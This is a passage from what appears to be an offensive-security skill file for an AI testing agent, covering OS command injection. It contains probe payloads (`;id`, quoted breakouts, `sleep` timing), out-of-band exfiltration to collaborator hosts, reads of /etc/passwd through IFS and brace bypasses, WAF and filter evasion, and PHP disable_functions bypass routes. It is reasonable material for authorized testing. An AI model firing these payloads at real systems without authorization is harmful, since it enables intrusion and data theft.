...
| Signal | Probe | Why |
|---|---|---|
| Input reflected in response? | `;id` or `&&id` | Classic separator injection |
| Input inside quoted argument? | `";id;"` or `';id;'` | Break out of string context |
| No visible output? | `;sleep 5` or `& timeout /T 5` | Time-based blind confirmation |
| Need OOB callback? | `;nslookup token.collab` | DNS exfiltration for blind sinks |
| WAF blocks spaces? | `cat$IFS/etc/passwd` or `{cat,/etc/passwd}` | IFS or brace expansion bypass |

```bash
# Quick test — inject after parameter value
# 1. Original: file=report.pdf
# 2. Probe:   file=report.pdf;id
# 3. If blind: file=report.pdf;sleep+5
# 4. If OOB:   file=report.pdf;nslookup+token.collab.com
```
...
- [upload insecure files](../file-upload/SKILL.md) when the shell sink is part of a broader upload, import, or conversion workflow
...
- [ ] Identify OS command parameters: ping/traceroute forms, file conversion, email senders, DNS lookup, log viewers
- [ ] Test command separators: `;`, `|`, `||`, `&`, `&&` with benign commands (`id`, `whoami`)
- [ ] Test command substitution: `$(id)`, `` `id` ``
- [ ] Test within quoted strings: `" ; id ; "`, `'; id;'`
- [ ] Test newline injection: `%0a`, `%0d%0a` as command separators
- [ ] Test blind injection via time-based detection: `sleep 5` (Linux), `timeout /T 5` (Windows)
- [ ] Test blind injection via OOB DNS: `nslookup TOKEN.collaborator`, `host \`whoami\`.collaborator`
- [ ] Test blind injection via OOB HTTP: `curl`, `wget`, `Invoke-WebRequest` to attacker server
- [ ] Test filter bypass: `$IFS` for spaces, glob expansion (`/???/??t`), variable assembly, base64/ROT13 encoding
- [ ] Test WAF bypass: wildcard expansion, cat alternatives (`tac`, `nl`, `base64`), comment insertion, chr() assembly
- [ ] Test PHP `disable_functions` bypass paths: LD_PRELOAD, Shellshock, mod_cgi, PHP-FPM, ImageMagick delegate
- [ ] Test component-level injection: ImageMagick MVG, FFmpeg HLS/concat, Elasticsearch Groovy

## MCP TOOLS

| Tool | Use Case |
|------|----------|
| `http_framework_test` | Craft custom HTTP requests to inject command payloads via parameters and headers |
| `http_repeater` | Replay and modify requests to test command injection variants and encoding |
| `nuclei_scan` | Run command injection vulnerability templates against target URLs |
| `burpsuite_alternative_scan` | Comprehensive web scanning to discover command injection surfaces |
| `api_fuzzer` | Fuzz API endpoints for command injection in parameters and request body |

## 13. COMPONENT-LEVEL COMMAND INJECTION
